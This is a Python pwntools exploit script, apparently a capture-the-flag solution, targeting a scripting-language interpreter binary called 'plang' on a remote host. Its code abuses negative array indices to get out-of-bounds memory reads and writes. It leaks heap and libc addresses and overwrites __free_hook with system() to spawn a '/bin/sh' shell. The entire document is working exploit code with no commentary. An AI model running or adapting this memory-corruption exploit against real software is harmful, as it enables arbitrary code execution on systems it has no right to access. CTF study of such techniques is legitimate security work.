from pwn import *
import struct
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./plang")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./plang")
else:
    p = remote("111.186.63.210","6666")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./plang")

def d2s(d):
    return struct.pack("<d",d)

def i2d(i):
    return u64(struct.pack("<d",i))

def d2i(d):
    info = struct.unpack("<d",p64(d))[0]
    print info
    return  "%.330f" % struct.unpack("d",p64(d))[0]

def command(com):
    p.sendlineafter("> ",com)

def read(addr,offset = 0):
    poc = """d[-{offset}] = {value}\n""".format(offset = offset/0x10,value = d2i(addr - 0x10))
    poc += "b[0] = {value}\n".format(value = d2i(0x4))
    poc += """d[-{offset}] = {value}\n""".format(offset = offset/0x10,value = d2i(addr - 0x8))
    poc += "System.print(b[0])"
    for x in poc.split("\n"):
        command(x)
    info = float(p.recvuntil("\n",drop = True))
    log.success("leak_info:" + str(info))
    info = i2d(info)
    return info

def write(addr,target,offset = 0):
    poc = """d[-{offset}] = {value}\n""".format(offset = offset/0x10,value = d2i(addr - 8))
    poc += "b[0] = {value}\n".format(value = d2i(target))
    for x in poc.split("\n"):
        command(x)

code_base = 0x555555554000
def debugf():
    gdb.attach(p,"b *{b1}\nb *{b2}\nb *{b3}".format(b1 = hex(code_base + 0x4627),b2 = hex(code_base + 0x104a6),b3 = hex(code_base + 0xfa27)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
poc_leak = """var a = "This is a Poc"
var c = 0x123
c = 0x124
System.print(a)
var b = [1, 0x123, 3, 7 , 8]
b[0]=0x123
b[-(0xee0/16)]=1
System.print(a[0x18] + a[0x19] + a[0x1a] + a[0x1b] + a[0x1c] + a[0x1d] + a[0x1e] + a[0x1f])"""
for x in poc_leak.split("\n"):
    command(x)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0xbac0
log.success("heap_base:" + hex(heap_base))
libc_info = heap_base + 0xd718
log.success("libc_info:" + hex(libc_info))
poc_leak = """var d = [0x123,0x124,1]
d[2] = 0x125"""
for x in poc_leak.split("\n"):
    command(x)
leak_info = read(libc_info,0xfa0)
libc.address = leak_info - 96 - 0x10 - libc.symbols["__malloc_hook"] 
log.success("libc_base:" + hex(libc.address))
one_gadget = libc.address + 0x4f322
system = libc.symbols["system"]
write(libc.symbols["__free_hook"],system,0xfa0)
command('var f = "/bin/sh"')
p.interactive()
